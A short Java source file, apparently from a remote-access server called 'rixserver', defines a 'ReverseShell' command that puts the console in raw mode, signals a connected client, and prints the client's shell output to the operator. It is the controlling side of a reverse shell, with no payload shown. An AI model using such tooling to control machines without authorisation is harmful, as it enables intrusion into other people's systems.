package com.trattwalds.rixserver.commands;

import java.util.List;

import com.trattwalds.rixserver.Client;
import com.trattwalds.rixserver.CommandLine;
import com.trattwalds.rixserver.Server;

public class ReverseShell extends Command {

	@Override
	public void execute(Client client, List<String> arguments) {
		CommandLine.setRawMode(true);
		client.sendHeader(0);
	}

	@Override
	public void onReceiveData(byte[] array, int numRead) {
		String recv = new String(array, 0, numRead);
		
		if (!recv.equals("exit\r\n")) {
			System.out.print(recv);
		}
	}

}
